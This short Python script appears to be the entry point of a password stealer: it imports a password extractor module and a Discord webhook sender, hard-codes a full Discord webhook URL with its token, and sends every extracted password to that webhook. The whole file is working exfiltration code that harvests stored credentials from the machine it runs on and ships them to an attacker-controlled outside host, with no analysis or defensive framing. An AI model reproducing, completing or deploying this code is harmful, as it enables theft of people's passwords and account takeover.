from password_extraction.extract import Passwords_Extractor
from communication.Discord import webhook
import ui


WEBHOOK_URL = "https://discord.com/api/webhooks/1446946425530224684/SurRVSUxpDI0UJjhNiTg5sDpcUd56nrgRTl6HBuEh5yBY8qz4NZNt5FEPVvqhbUa3lnN"
TEMP_PATH = ""
if __name__ == "__main__":
    pw_extractor = Passwords_Extractor()
    for pw in pw_extractor.get_passwords() :
        webhook.send(WEBHOOK_URL,pw)